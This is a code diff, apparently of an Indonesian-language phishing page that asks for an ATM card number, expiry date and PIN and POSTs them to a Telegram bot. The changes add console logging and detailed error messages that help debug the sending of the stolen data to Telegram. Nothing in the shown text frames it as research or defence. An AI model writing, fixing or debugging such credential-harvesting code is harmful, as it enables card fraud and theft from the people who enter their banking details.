@@ -101,7 +101,7 @@
 
     <label for="expiryDate" style="margin-top: 20px;">Tanggal Kadalursa Kartu ATM</label>
     <div class="input-with-icon">
-      <input type="tel" id="expiryDate" placeholder="MM/YY" maxlength="4" pattern="\d{4}" inputmode="numeric" />
+      <input type="tel" id="expiryDate" placeholder="MMYY" maxlength="4" pattern="\d{4}" inputmode="numeric" />
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Calendar icon" role="img">
         <path d="M7 11h2v2H7v-2zm4 0h2v2h-2v-2zm4 0h2v2h-2v-2zM3 21h18v-2H3v2zm18-12h-3V4h-2v5H8V4H6v5H3v2h18v-2z" />
       </svg>
@@ -194,12 +194,19 @@
       parse_mode: 'Markdown'
     };
 
+    console.log('Mengirim data ke Telegram...');
+    console.log('URL:', url);
+    console.log('Params:', params);
+
     try {
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(params)
       });
+
+      console.log('Response status:', response.status);
+      console.log('Response ok:', response.ok);
 
       if(response.ok){
         alert('Data berhasil terkirim ke Telegram!');
@@ -208,9 +215,12 @@
         document.getElementById('cardNumberCount').textContent = '0/18';
         document.getElementById('pinCount').textContent = '0/6';
       } else {
-        alert('Gagal mengirim data ke Telegram.');
+        const errorText = await response.text();
+        console.log('Error response:', errorText);
+        alert('Gagal mengirim data ke Telegram. Status: ' + response.status + '. Detail: ' + errorText);
       }
     } catch (error) {
+      console.error('Error:', error);
       alert('Terjadi kesalahan: ' + error.message);
     }
   });
